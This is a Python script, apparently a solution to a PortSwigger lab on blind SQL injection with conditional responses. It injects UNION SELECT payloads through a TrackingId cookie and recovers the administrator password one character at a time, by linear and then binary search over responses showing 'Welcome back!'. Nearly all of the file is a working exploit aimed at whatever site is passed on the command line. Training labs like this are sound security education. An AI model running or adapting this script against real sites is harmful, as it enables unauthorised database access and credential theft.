"""
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
"""

import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
import time
import string
import math

# Pulls the website to attack from the 1st argument to the program
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')
url = f'https://{site}/'

# Creates a session to launch the attack
s = requests.Session()

def try_query(query):
    """
    Attatches a query string to a "TrackingId" cookie pulled from a website
    The website will display "Welcome back!" if the string is successfully planted
    Args:
        query (str): SQL statement to attatch to the cookie
    Returns:
        boolean: checks if the site displays "Welcome back!"
    """
    mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
    resp = requests.get(url, cookies=mycookies)

    # Check the status code to see if the get requests succeeds
    if resp.status_code != 200:
        print("Get request failed")
        sys.exit()

    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


def linearSearch():
    """
    Brute forces a password by checking each password character
    against the range of possible characters. Appends the correct
    character to the password when it is found.
    Args:
        None
    Returns:
        password (str): the password assembled from the brute force attack
    """
    begin_time = time.perf_counter()
    charset = string.ascii_lowercase + string.digits
    password = ''

    while True:
        for c in charset:
            query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password ~ '^{password}{c}'--"
            if try_query(query) == True:
                password = password + c
                break
        print(password)

        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password ~ '^{password}$'--"
        if try_query(query) == True:
            break
    
    print(f"Time elapsed is {time.perf_counter()-begin_time}")
    return password

def binarySearch(charset, password):
    """
    Uses a binary search to identify which character in the charset the
    next password character will be.
    Args:
        charset (char array): the set of possible characters for the password
        password (str): the password characters that have been discovered so far
    Returns:
        char: the next character in the password
    """
    low = 0
    high = len(charset)

    while(len(charset[low:high]) > 1):
        mid = math.floor((low + high) /2)

        if try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{password}[{charset[mid:high]}]' --""") == True:
            low = mid
        else:
            high = mid

    return charset[low]


def binarySearchDriver():
    """
    Sets up the environment for a binary search and executes a binary search
    for each character in the password. Appends the correct character to the password.
    Args:
        None
    Returns:
        password (str): the password assembled by the binary search
    """
    begin_time = time.perf_counter()
    charset = string.ascii_lowercase + string.digits
    password = ''

    while True:
        nextChar = binarySearch(charset, password)
        password = password + nextChar
        print(password)

        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password ~ '^{password}$'--"
        if try_query(query) == True:
            break
    
    print(f"Time elapsed is {time.perf_counter()-begin_time}")
    return password

password = linearSearch()
print(f"Password is {password}")

password = binarySearchDriver()
print(f"Password is {password}")